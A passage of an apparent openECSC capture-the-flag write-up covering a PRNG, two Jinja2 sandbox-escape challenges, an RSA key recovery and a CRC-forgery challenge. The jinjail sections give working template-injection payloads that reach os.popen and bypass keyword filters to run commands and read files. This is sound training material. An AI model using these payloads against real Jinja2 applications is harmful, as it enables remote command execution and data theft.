+        plaintext = <span class="hljs-built_in">bytes</span>([a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x[<span class="hljs-number">8</span> * (t - <span class="hljs-number">1</span>) : <span class="hljs-number">8</span> * t], key)])
+        <span class="hljs-keyword">if</span> is_printable(plaintext):
+            <span class="hljs-built_in">print</span>(plaintext)
+            sols += [sol + [plaintext.decode()[::-<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> sol <span class="hljs-keyword">in</span> unwind(s, t - <span class="hljs-number">1</span>)]
+    <span class="hljs-keyword">return</span> sols
+<span class="hljs-built_in">print</span>([<span class="hljs-string">&#x27;&#x27;</span>.join(sol[::-<span class="hljs-number">1</span>]) <span class="hljs-keyword">for</span> sol <span class="hljs-keyword">in</span> unwind(last_state, <span class="hljs-number">10</span>)])
+<span class="hljs-comment"># flag: openECSC&lbrace;How??_Oh_maybe_I_shouldn&#x27;t_make_my_own_PRNG_1_h0p3_you_l1k3d_th15_cha113ng3!1!&rbrace;</span></pre><h3>jinjail</h3><pre >by xtea418
+
+pyjail but jinja sandbox?</pre><p>Here is the code:</p><pre ><span class="hljs-keyword">import</span> typing
+
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
+<span class="hljs-keyword">from</span> jinja2.sandbox <span class="hljs-keyword">import</span> SandboxedEnvironment
+
+app = Flask(__file__)
+
+env = SandboxedEnvironment()
+env.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&quot;typing&quot;</span>] = typing
+
+
+<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">render</span>():
+    content = request.form[<span class="hljs-string">&quot;content&quot;</span>]
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;module&quot;</span> <span class="hljs-keyword">in</span> content:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;funny (ab)user.&quot;</span>
+    <span class="hljs-comment"># 😇😇😇</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(content) &lt; <span class="hljs-number">75</span>
+        <span class="hljs-keyword">return</span> env.from_string(content).render()
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-comment"># 🚨🚨🚨</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;funny (ab)user.&quot;</span>
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    app.run(<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">1337</span>, debug=<span class="hljs-literal">False</span>)</pre><p>The flag is at <code>/flag.txt</code>. Looking into it, a Jinja2 sandbox blocks attributes starting with an underscore and some other special ones like <code>mro</code>. The challenge supplies typing in the globals, so we look for attributes we can call there:</p><pre >&gt;&gt;&gt; list(filter(lambda x: not x.startswith(&#039;_&#039;), typing.__dict__.keys()))
+[&#039;abstractmethod&#039;, &#039;ABCMeta&#039;, &#039;collections&#039;, &#039;defaultdict&#039;, &#039;copyreg&#039;, &#039;functools&#039;, &#039;operator&#039;, &#039;sys&#039;, &#039;types&#039;, &#039;WrapperDescriptorType&#039;, &#039;MethodWrapperType&#039;, &#039;MethodDescriptorType&#039;, &#039;GenericAlias&#039;, &#039;TypeVar&#039;, &#039;ParamSpec&#039;, &#039;TypeVarTuple&#039;, &#039;ParamSpecArgs&#039;, &#039;ParamSpecKwargs&#039;, &#039;TypeAliasType&#039;, &#039;Generic&#039;, &#039;NoDefault&#039;, &#039;Any&#039;, &#039;NoReturn&#039;, &#039;Never&#039;, &#039;Self&#039;, &#039;LiteralString&#039;, &#039;ClassVar&#039;, &#039;Final&#039;, &#039;Union&#039;, &#039;Optional&#039;, &#039;Literal&#039;, &#039;TypeAlias&#039;, &#039;Concatenate&#039;, &#039;TypeGuard&#039;, &#039;TypeIs&#039;, &#039;ForwardRef&#039;, &#039;Unpack&#039;, &#039;EXCLUDED_ATTRIBUTES&#039;, &#039;Protocol&#039;, &#039;Annotated&#039;, &#039;runtime_checkable&#039;, &#039;cast&#039;, &#039;assert_type&#039;, &#039;get_type_hints&#039;, &#039;get_origin&#039;, &#039;get_args&#039;, &#039;is_typeddict&#039;, &#039;assert_never&#039;, &#039;no_type_check&#039;, &#039;no_type_check_decorator&#039;, &#039;overload&#039;, &#039;get_overloads&#039;, &#039;clear_overloads&#039;, &#039;final&#039;, &#039;T&#039;, &#039;KT&#039;, &#039;VT&#039;, &#039;T_co&#039;, &#039;V_co&#039;, &#039;VT_co&#039;, &#039;T_contra&#039;, &#039;CT_co&#039;, &#039;AnyStr&#039;, &#039;Hashable&#039;, &#039;Awaitable&#039;, &#039;Coroutine&#039;, &#039;AsyncIterable&#039;, &#039;AsyncIterator&#039;, &#039;Iterable&#039;, &#039;Iterator&#039;, &#039;Reversible&#039;, &#039;Sized&#039;, &#039;Container&#039;, &#039;Collection&#039;, &#039;Callable&#039;, &#039;AbstractSet&#039;, &#039;MutableSet&#039;, &#039;Mapping&#039;, &#039;MutableMapping&#039;, &#039;Sequence&#039;, &#039;MutableSequence&#039;, &#039;ByteString&#039;, &#039;Tuple&#039;, &#039;List&#039;, &#039;Deque&#039;, &#039;Set&#039;, &#039;FrozenSet&#039;, &#039;MappingView&#039;, &#039;KeysView&#039;, &#039;ItemsView&#039;, &#039;ValuesView&#039;, &#039;Dict&#039;, &#039;DefaultDict&#039;, &#039;OrderedDict&#039;, &#039;Counter&#039;, &#039;ChainMap&#039;, &#039;Generator&#039;, &#039;AsyncGenerator&#039;, &#039;Type&#039;, &#039;SupportsInt&#039;, &#039;SupportsFloat&#039;, &#039;SupportsComplex&#039;, &#039;SupportsBytes&#039;, &#039;SupportsIndex&#039;, &#039;SupportsAbs&#039;, &#039;SupportsRound&#039;, &#039;NamedTupleMeta&#039;, &#039;NamedTuple&#039;, &#039;TypedDict&#039;, &#039;Required&#039;, &#039;NotRequired&#039;, &#039;ReadOnly&#039;, &#039;NewType&#039;, &#039;Text&#039;, &#039;TYPE_CHECKING&#039;, &#039;IO&#039;, &#039;BinaryIO&#039;, &#039;TextIO&#039;, &#039;reveal_type&#039;, &#039;dataclass_transform&#039;, &#039;override&#039;, &#039;is_protocol&#039;, &#039;get_protocol_members&#039;]</pre><p>We can access the <code>sys</code> module, which seems promising. The code blocks <code>module</code> but this is easy to get around and we can access the <code>os</code> module. From there, it&#039;s easy; we can run arbitrary commands. This payload works:</p><pre >url = https://1d12ae61-882d-424f-9fcc-0261599d1f39.openec.sc:1337/
+-d &quot;content=&lbrace;&lbrace; typing.sys[&#039;mod&#039;+&#039;ules&#039;][&#039;os&#039;].popen(&#039;cat /flag.txt&#039;).read() &rbrace;&rbrace;&quot;</pre><p>And just like that, we get the flag.</p><pre >HTTP/1.1 200 OK
+Content-Length: 43
+Content-Type: text/html; charset=utf-8
+Date: Wed, 01 Oct 2025 13:48:45 GMT
+Server: Werkzeug/3.1.3 Python/3.12.11
+
+openECSC&lbrace;l04d3r_g0_brrrrrrrr_be03fe98e1c1&rbrace;</pre><h3>jinjail2</h3><pre >by xtea418
+
+pyjail but jinja sandbox? 😇😇😇</pre><p>Similar to the last one, here is the code:</p><pre ><span class="hljs-keyword">import</span> typing
+
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
+<span class="hljs-keyword">from</span> jinja2.sandbox <span class="hljs-keyword">import</span> SandboxedEnvironment
+
+app = Flask(__file__)
+
+env = SandboxedEnvironment()
+env.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&quot;typing&quot;</span>] = typing
+
+
+<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">render</span>():
+    content = request.form[<span class="hljs-string">&quot;content&quot;</span>]
+    <span class="hljs-comment"># 😇😇😇</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;sys&quot;</span> <span class="hljs-keyword">in</span> content <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;__&quot;</span> <span class="hljs-keyword">in</span> content <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(content) &gt; <span class="hljs-number">150</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;funny (ab)user.&quot;</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">return</span> env.from_string(content).render()
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-comment"># 🚨🚨🚨</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;funny (ab)user.&quot;</span>
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    app.run(<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">1337</span>, debug=<span class="hljs-literal">False</span>)</pre><p>But the flag filename is also random:</p><pre >COPY flag.txt /flag.txt
+
+RUN mv /flag.txt &quot;/$(cat /dev/urandom | head -c 45 | hexdump | tr -d &#039; \n&#039;)_flag.txt&quot;</pre><p>This isn&#039;t a problem if we have RCE, since we can <code>ls</code> for the filename. Essentially the only difference from the previous challenge is that the code blocks <code>sys</code>, but this is easy to get around, taking in mind that Jinja2 allows us to run <code>obj|attr(&#039;name&#039;)</code> to dynamically access an attribute. We have this:</p><pre >url = https://ce469611-7268-48fe-8fa8-888b473ce756.openec.sc:1337/
+-d &quot;content=&lbrace;&lbrace; (typing|attr(&#039;sy&#039;+&#039;s&#039;))[&#039;mod&#039;+&#039;ules&#039;][&#039;os&#039;].popen(&#039;ls /&#039;).read() &rbrace;&rbrace;&quot;</pre><p>Then:</p><pre >HTTP/1.1 200 OK
+Content-Length: 100
+Content-Type: text/html; charset=utf-8
+Date: Wed, 01 Oct 2025 14:11:10 GMT
+Server: Werkzeug/3.1.3 Python/3.12.11
+
+a9d550abbb92_flag.txt
+app
+bin
+...</pre><p>And just run the payload again but with <code>cat</code>. The flag is:</p><pre >openECSC&lbrace;4tt3rg4ttr_g0_brrrrrrrr_9492f5d4b6b9&rbrace;</pre><h3>swapped</h3><pre >by Dimitris-Toulis
+
+Surely I can just swap e and d, right?</pre><p>We are given:</p><pre ><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime
+
+p = getPrime(<span class="hljs-number">1024</span>)
+q = getPrime(<span class="hljs-number">1024</span>)
+<span class="hljs-keyword">if</span> p &gt; q:
+	p, q = q, p
+N = p * q
+
+e = getPrime(<span class="hljs-number">500</span>)
+d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))
+e, d = d, e
+
+primes = [getPrime(<span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]
+e_residues = [e % p <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> primes]
+
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
+
+flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()
+key = sha256((<span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(q)).encode()).digest()
+ct = AES.new(key, AES.MODE_ECB).encrypt(pad(flag, <span class="hljs-number">16</span>)).<span class="hljs-built_in">hex</span>()
+
+<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">f&#x27;&#x27;&#x27;\
+<span class="hljs-subst">&lbrace;N = &rbrace;</span>
+<span class="hljs-subst">&lbrace;primes = &rbrace;</span>
+<span class="hljs-subst">&lbrace;e_residues = &rbrace;</span>
+ct = <span class="hljs-subst">&lbrace;ct&rbrace;</span>
+&#x27;&#x27;&#x27;</span>)</pre><p>Solution code:</p><pre ><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
+<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path
+
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+
+<span class="hljs-built_in">exec</span>(Path(<span class="hljs-string">&#x27;output.txt&#x27;</span>).read_text())
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">wiener</span>(<span class="hljs-params">e, N</span>):
+    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> continued_fraction(e / N).convergents():
+        k, d = f.as_integer_ratio()
+        <span class="hljs-keyword">if</span> k != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (e * d) % k == <span class="hljs-number">1</span>:
+            phi = (e * d - <span class="hljs-number">1</span>) // k
+            x = var(<span class="hljs-string">&#x27;x&#x27;</span>, domain=ZZ)
+            <span class="hljs-keyword">if</span> sol := solve(x**<span class="hljs-number">2</span> - (N - phi + <span class="hljs-number">1</span>) * x + N, x):
+                <span class="hljs-keyword">return</span> sol
+
+e = crt(e_residues, primes)
+p, q = wiener(e, N)
+p, q = <span class="hljs-built_in">min</span>(p, q), <span class="hljs-built_in">max</span>(p, q)
+key = sha256((<span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(q)).encode()).digest()
+<span class="hljs-built_in">print</span>(AES.new(key, AES.MODE_ECB).decrypt(ct))</pre><h3>polite-email</h3><pre >by dagurb
+
+When begging for challenge hints and flags, it&#039;s good to be polite.</pre><p>And we are given this script:</p><pre ><span class="hljs-keyword">from</span> fastcrc <span class="hljs-keyword">import</span> crc32, crc64
+<span class="hljs-keyword">import</span> os
+
+crc32s = [<span class="hljs-string">&#x27;autosar&#x27;</span>, <span class="hljs-string">&#x27;iscsi&#x27;</span>, <span class="hljs-string">&#x27;iso_hdlc&#x27;</span>]
+crc64s = [<span class="hljs-string">&#x27;go_iso&#x27;</span>, <span class="hljs-string">&#x27;xz&#x27;</span>]
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">ImpossibleMAC</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, mac: <span class="hljs-built_in">int</span></span>):
+	<span class="hljs-keyword">for</span> algo <span class="hljs-keyword">in</span> crc32s:
+		crc = <span class="hljs-built_in">getattr</span>(crc32, algo)
+		imac: <span class="hljs-built_in">bytes</span> = crc(data)
+		<span class="hljs-keyword">if</span> imac != mac:
+			<span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+	<span class="hljs-keyword">for</span> algo <span class="hljs-keyword">in</span> crc64s:
+		crc = <span class="hljs-built_in">getattr</span>(crc64, algo)
+		imac: <span class="hljs-built_in">bytes</span> = crc(data)
+		<span class="hljs-keyword">if</span> imac != mac:
+			<span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+	
+	<span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">makeEmail</span>(<span class="hljs-params">sender: <span class="hljs-built_in">str</span>, recipient: <span class="hljs-built_in">str</span>, body: <span class="hljs-built_in">str</span></span>):
+	<span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;&#x27;&#x27;Dear <span class="hljs-subst">&lbrace;recipient&rbrace;</span>.
+
+<span class="hljs-subst">&lbrace;body&rbrace;</span>
+
+Best regards,
+<span class="hljs-subst">&lbrace;sender&rbrace;</span>&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">sendEmailToAuthor</span>(<span class="hljs-params">sender: <span class="hljs-built_in">str</span>, data: <span class="hljs-built_in">bytes</span>, mac: <span class="hljs-built_in">int</span></span>):
+	politeEmail = makeEmail(sender, <span class="hljs-string">&#x27;Challenge Author&#x27;</span>, <span class="hljs-string">&#x27;Pretty please give me the flag.&#x27;</span>).encode()
+
+	<span class="hljs-comment"># Make sure to be polite when you ask the challenge author for the flag </span>
+	<span class="hljs-keyword">if</span> politeEmail <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:
+		<span class="hljs-keyword">return</span> makeEmail(<span class="hljs-string">&#x27;Challenge Author&#x27;</span>, sender, <span class="hljs-string">&#x27;That is not very polite. As such I will not give you the flag.&#x27;</span>)
+
+	<span class="hljs-comment"># Careful! If the MAC is not correct, how will the author know if the message was sent correctly?</span>
+	<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ImpossibleMAC(data, mac):
+		<span class="hljs-keyword">return</span> makeEmail(<span class="hljs-string">&#x27;Challenge Author&#x27;</span>, sender, <span class="hljs-string">&#x27;Okay that was very polite, but the MAC was not correct. Can you please resend the mail?&#x27;</span>)
+
+	<span class="hljs-keyword">return</span> makeEmail(<span class="hljs-string">&#x27;Challenge Author&#x27;</span>, sender, <span class="hljs-string">f&#x27;Sure.\nHere\&#x27;s the flag: <span class="hljs-subst">&lbrace;os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)&rbrace;</span>. But please do not tell the orga that I gave you this flag.&#x27;</span>)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+	name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter name: &#x27;</span>)
+	email = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter mail: &#x27;</span>))
+	mac = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter MAC: &#x27;</span>))
+	<span class="hljs-built_in">print</span>(sendEmailToAuthor(name, email, mac))</pre><p>I looked at the code for <code>fastcrc</code>, and noted that the configurations all have the same parameters except for the polynomial. Firstly, we define some helper functions to make it easier to work with.</p><pre >R.&lt;x&gt; = GF(<span class="hljs-number">2</span>)[<span class="hljs-string">&#x27;x&#x27;</span>]
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">bitstream_to_polynomial</span>(<span class="hljs-params">stream: <span class="hljs-built_in">str</span></span>):
+    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">set</span>(stream).issubset(&lbrace;<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>&rbrace;)
+    <span class="hljs-keyword">return</span> R(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, stream))[::-<span class="hljs-number">1</span>])
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">i2p</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>):
+    <span class="hljs-keyword">return</span> bitstream_to_polynomial(<span class="hljs-built_in">bin</span>(n)[<span class="hljs-number">2</span>:])
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">p2i</span>(<span class="hljs-params">p</span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, p.<span class="hljs-built_in">list</span>()[::-<span class="hljs-number">1</span>])), <span class="hljs-number">2</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">b2p</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>):
+    <span class="hljs-keyword">return</span> bitstream_to_polynomial(
+        <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">bin</span>(b)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data)
+    )
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">p2b</span>(<span class="hljs-params">p</span>):
+    l = ceil(p.degree() / <span class="hljs-number">8</span>) * <span class="hljs-number">8</span>
+    b = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, p.<span class="hljs-built_in">list</span>()[::-<span class="hljs-number">1</span>])).zfill(l)
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">int</span>(b[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, l, <span class="hljs-number">8</span>))
+
+<span class="hljs-comment"># means we reverse the bitstream bytewise.</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">reflect</span>(<span class="hljs-params">bs: <span class="hljs-built_in">bytes</span></span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(b)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)[::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bs)
+
+<span class="hljs-comment"># means we reverse the bitstream.</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">reflect_i32</span>(<span class="hljs-params">num</span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(num)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)[::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">reflect_i64</span>(<span class="hljs-params">num</span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(num)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">64</span>)[::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)
+
+<span class="hljs-comment"># basically flipping, too lazy to implement arbitrary init</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">bs: <span class="hljs-built_in">bytes</span></span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(b^^<span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bs)
+</pre><p>Then, we model the problem in SageMath, setting up some test cases to ensure the outputs matches the outputs from the library <code>fastcrc</code>.</p><pre ><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():
+    <span class="hljs-comment"># poly = 0x04C11DB7</span>
+    <span class="hljs-comment"># refin = false</span>
+    <span class="hljs-comment"># refout = false</span>
+    <span class="hljs-comment"># init = 0xffffffff</span>
+    <span class="hljs-comment"># xorout = 0xffffffff</span>
+    g = x**<span class="hljs-number">32</span> + i2p(<span class="hljs-number">0x04C11DB7</span>)
+    m = b2p(xor(<span class="hljs-string">b&#x27;1234&#x27;</span>) + <span class="hljs-string">b&#x27;56789&#x27;</span>) * x**<span class="hljs-number">32</span>
+    crc = p2i(m.quo_rem(g)[<span class="hljs-number">1</span>]) ^^ <span class="hljs-number">0xffffffff</span>
+    <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">hex</span>(crc) == <span class="hljs-string">&#x27;0xfc891918&#x27;</span>)
+
+    <span class="hljs-comment"># poly = 0x04C11DB7</span>
+    <span class="hljs-comment"># refin = true</span>
+    <span class="hljs-comment"># refout = false</span>
+    <span class="hljs-comment"># init = 0xffffffff</span>
+    <span class="hljs-comment"># xorout = 0xffffffff</span>
+    g = x**<span class="hljs-number">32</span> + i2p(<span class="hljs-number">0x04C11DB7</span>)
+    m = b2p(reflect(xor(<span class="hljs-string">b&#x27;1234&#x27;</span>) + <span class="hljs-string">b&#x27;56789&#x27;</span>)) * x**<span class="hljs-number">32</span>
+    crc = p2i(m.quo_rem(g)[<span class="hljs-number">1</span>]) ^^ <span class="hljs-number">0xffffffff</span>
+    <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">hex</span>(crc) == <span class="hljs-string">&#x27;0x649c2fd3&#x27;</span>)
+
+    <span class="hljs-comment"># poly = 0x04C11DB7</span>
+    <span class="hljs-comment"># refin = true</span>
+    <span class="hljs-comment"># refout = true</span>
+    <span class="hljs-comment"># init = 0xffffffff</span>
+    <span class="hljs-comment"># xorout = 0xffffffff</span>
+    g = x**<span class="hljs-number">32</span> + i2p(<span class="hljs-number">0x04C11DB7</span>)
+    m = b2p(reflect(xor(<span class="hljs-string">b&#x27;1234&#x27;</span>) + <span class="hljs-string">b&#x27;56789&#x27;</span>)) * x**<span class="hljs-number">32</span>
+    crc = reflect_i32(p2i(m.quo_rem(g)[<span class="hljs-number">1</span>])) ^^ <span class="hljs-number">0xffffffff</span>
+    <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">hex</span>(crc) == <span class="hljs-string">&#x27;0xcbf43926&#x27;</span>)
+
+    <span class="hljs-comment"># poly = 0x000000000000001b</span>
+    <span class="hljs-comment"># refin = true</span>
+    <span class="hljs-comment"># refout = true</span>
+    <span class="hljs-comment"># init = 0xffffffffffffffff</span>
+    <span class="hljs-comment"># xorout = 0xffffffffffffffff</span>
+    g = x**<span class="hljs-number">64</span> + i2p(<span class="hljs-number">0x000000000000001b</span>)
+    m = b2p(reflect(xor(<span class="hljs-string">b&#x27;12345678&#x27;</span>))) * x**<span class="hljs-number">64</span>
+    crc = reflect_i64(p2i(m.quo_rem(g)[<span class="hljs-number">1</span>])) ^^ <span class="hljs-number">0xffffffffffffffff</span>
+    <span class="hljs-keyword">assert</span> (crc == <span class="hljs-number">8743395034664010163</span>)
+test()</pre><p>Now, we can setup a system:</p><p>$$\begin{aligned}(p_0 + m)x^{32} &= r_0 \pmod{g_0} \\ (p_0 + m)x^{32} &= r_0 \pmod{g_1} \\ (p_0 + m)x^{32} &= r_0 \pmod{g_2} \\ (p_1 + m)x^{64} &= r_1 \pmod{g_3} \\ (p_1 + m)x^{64} &= r_1 \pmod{g_4}\end{aligned}$$</p><p>Which we can reorganize:</p><p>$$\begin{aligned}m &= r_0x^{-32} - p_0 \pmod{g_0} \\ m &= r_0x^{-32} - p_0 \pmod{g_1} \\ m &= r_0x^{-32} - p_0 \pmod{g_2} \\ m &= r_1x^{-64} - p_1 \pmod{g_3} \\ m &= r_1x^{-64} - p_1 \pmod{g_4}\end{aligned}$$</p><p>In code:</p><pre ><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_prefix</span>(<span class="hljs-params">PREFIX</span>):
+    p0_ = xor(PREFIX[:<span class="hljs-number">4</span>]) + PREFIX[<span class="hljs-number">4</span>:]
+    p1_ = xor(PREFIX[:<span class="hljs-number">8</span>]) + PREFIX[<span class="hljs-number">8</span>:]
+
+    p0 = b2p(reflect(p0_ + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">32</span>))
+    p1 = b2p(reflect(p1_ + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">32</span>))
+    r0 = i2p(<span class="hljs-number">0xffffffff</span>)
+    r1 = i2p(<span class="hljs-number">0xffffffffffffffff</span>)
+    gs = []
+    rs = []
+    <span class="hljs-keyword">for</span> i, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>([<span class="hljs-number">0xf4acfb13</span>, <span class="hljs-number">0x1edc6f41</span>, <span class="hljs-number">0x04c11db7</span>]):
+        gs.append(x**<span class="hljs-number">32</span> + i2p(p))
+        rs.append(r0 * (x**<span class="hljs-number">32</span>).inverse_mod(gs[-<span class="hljs-number">1</span>]) - p0)
+    <span class="hljs-keyword">for</span> i, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>([<span class="hljs-number">0x000000000000001b</span>, <span class="hljs-number">0x42f0e1eba9ea3693</span>]):
+        gs.append(x**<span class="hljs-number">64</span> + i2p(p))
+        rs.append(r1 * (x**<span class="hljs-number">64</span>).inverse_mod(gs[-<span class="hljs-number">1</span>]) - p1)
+    sol = crt(rs, gs)
+    suffix = p2b(sol).rjust(<span class="hljs-number">32</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
+
+    <span class="hljs-keyword">for</span> i, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>([<span class="hljs-number">0xf4acfb13</span>, <span class="hljs-number">0x1edc6f41</span>, <span class="hljs-number">0x04c11db7</span>]):
+        g = x**<span class="hljs-number">32</span> + i2p(p)
+        m = (b2p(reflect(p0_) + suffix)) * x**<span class="hljs-number">32</span>
+        crc = reflect_i32(p2i(m.quo_rem(g)[<span class="hljs-number">1</span>])) ^^ <span class="hljs-number">0xffffffff</span>
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;crc<span class="hljs-subst">&lbrace;i&rbrace;</span> =&#x27;</span>, crc)
+    <span class="hljs-keyword">for</span> i, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>([<span class="hljs-number">0x000000000000001b</span>, <span class="hljs-number">0x42f0e1eba9ea3693</span>]):
+        g = x**<span class="hljs-number">64</span> + i2p(p)
+        m = (b2p(reflect(p1_) + suffix)) * x**<span class="hljs-number">64</span>
+        crc = reflect_i64(p2i(m.quo_rem(g)[<span class="hljs-number">1</span>])) ^^ <span class="hljs-number">0xffffffffffffffff</span>
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;crc<span class="hljs-subst">&lbrace;i&rbrace;</span> =&#x27;</span>, crc)
+
+    suffix = reflect(suffix)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;suffix:&#x27;</span>, suffix)
